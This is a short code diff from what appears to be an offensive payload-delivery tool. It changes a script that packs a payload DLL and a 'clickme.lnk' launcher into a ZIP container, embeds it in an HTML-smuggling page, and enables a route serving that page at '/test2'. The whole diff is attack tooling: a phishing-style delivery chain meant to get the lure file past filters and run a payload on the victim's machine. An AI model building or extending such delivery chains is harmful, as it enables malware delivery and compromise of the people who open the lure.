@@ -2,6 +2,7 @@ from make.htmlsmuggling.htmlsmuggling import makeHtmlSmuggling
 from make.lnk.lnk import makeLnk
 from make.iso.iso import makeIso
 from make.powershell.powershell import makePowershell
+from make.zip.zip import makeZip
 
 from helpers import readFileContent, saveAceFile, makeAceFile
 from model import AceFile, AceRoute, PluginDecorator, enableOut
@@ -27,13 +28,13 @@ def main():
     payloadExeFile = makeAceFile('clickme.lnk', payloadExec)
 
     # Pack DLL and LNK into ISO
-    container = makeIso(
+    container = makeZip(
         files = [
             payloadFile,
             payloadExeFile,
         ],
     )
-    containerFile = makeAceFile('test2.iso', container)
+    containerFile = makeAceFile('test2.zip', container)
 
     # HTML to serve ISO
     html = makeHtmlSmuggling(
@@ -42,7 +43,7 @@ def main():
 
     # serve HTML
     serveHtml = AceRoute('/test2', html)
-    #serve([serveHtml])
+    serve([serveHtml])
 
 
 if __name__ == "__main__":
